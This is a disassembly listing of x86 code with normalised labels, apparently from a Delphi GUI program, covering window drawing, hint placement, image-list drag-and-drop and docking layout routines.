mov eax esi
call sub_440aec
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40be98
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_440a84
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_445014
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44506a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445071
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ReleaseDC
retn
sub_445078
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_445111
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41de80
mov eax ebx
call sub_43f798
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x14 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x208 ]
call sub_41ed94
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445118
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
sub_445120
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44518c
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_445217
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44521e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43d484
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41ebf4
mov edx eax
add edx 0x6
mov eax esi
call sub_43cc40
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43d484
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41ec10
mov edx eax
add edx 0x4
mov eax esi
call sub_43cc64
sub_445224
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4453fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d4b4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43e6d0
mov eax [ esi ]
call sub_45ae50
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45ae5c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45ae50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45ae44
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45ae5c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45ae38
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45ae44
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45ae38
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_441394
push 0x4
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445404
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4041b8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4484bc
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call [ rw-data ]
sub_44540c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445434
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412cd4
mov eax esi
call sub_43f798
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ esi + 0x208 ]
call sub_41ed94
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_445490
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412cd4
call sub_4335f0
call sub_4336d0
test al al
jne r-xdata
call sub_4335f0
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_433a90
push esp
push 0x1
push 0xf
push 0x0
call sub_4335f0
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_433790
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4454fc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_441c9c
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_445520
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445578
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445638
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b324
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_425640
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b324
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_425640
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_445644
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44a798
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4456a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b40c
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4456d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44a5c4
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_445578
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_445730
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_445644
push 0x0
call ShowCursor
sub_445730
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44a5c4
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_445794
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_445520
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_445794
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4457b8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_445520
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44582c
push ebx
push esi
mov esi eax
mov eax esi
call sub_44a5c4
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_445794
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_44568c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_445874
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f98c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43c060
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4458d0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43fab0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_445920
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41eaa0
xor eax eax
push ebp
push sub_4459be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41ee14
xor eax eax
push ebp
push sub_44599b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43c078
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4459a2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41ee14
retn
sub_4459d0
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_445a64
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4459ec
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_445a64
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_44605c
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_445a64
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_445a98
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_445b28
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov edx 0x2
call sub_445b28
jmp r-xdata
retn
sub_445ae0
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_445b94
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov edx 0x2
call sub_445b94
jmp r-xdata
retn
sub_445b28
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_445f5c
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_445b94
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_445a48
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_445f5c
push eax
mov eax esi
call sub_445a98
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_445f5c
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_445c44
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_445a48
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44605c
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_445b94
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_445a48
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_445b94
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_445a98
mov edx eax
add edx esi
mov eax ebx
call sub_445f84
mov edx edi
mov eax ebx
call sub_445f84
jmp r-xdata
mov eax ebx
call sub_445de4
mov eax ebx
call sub_446034
mov ebx eax
test ebx ebx
jne r-xdata
sub_445cec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403ef8
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
sub_445d30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403320
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_445da1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43e178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_445db4
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_446034
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_445de4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_445b94
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445b94
mov esi eax
push ebp
call sub_445db4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446034
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445b28
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_445b28
mov ecx ebx
pop edx
call sub_412cfc
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43ce44
mov eax [ ebp - 0x4 ]
call sub_445f5c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_445f5c
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_445f5c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_445f5c
push ebx
mov ebx eax
mov eax ebx
call sub_445a64
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4459ec
test al al
je r-xdata
mov eax ebx
call sub_445a98
pop ebx
retn
sub_445f98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445f84
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_445a34
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_445f88
mov edx esi
call sub_445f98
sub_445fd4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_445f5c
mov edi eax
mov eax ebx
call sub_445a98
cmp edi eax
jl r-xdata
mov eax esi
call sub_445c44
mov eax [ esi + 0x1c ]
push eax
push sub_447ae4
mov edx esi
call sub_446310
mov eax ebx
call sub_445f5c
mov edi eax
mov eax esi
call sub_445ae0
cmp edi eax
jle r-xdata
mov eax ebx
call sub_445fd4
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_446040
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_445a64
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_446068
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403448
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_445a10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e4a4
mov ebx eax
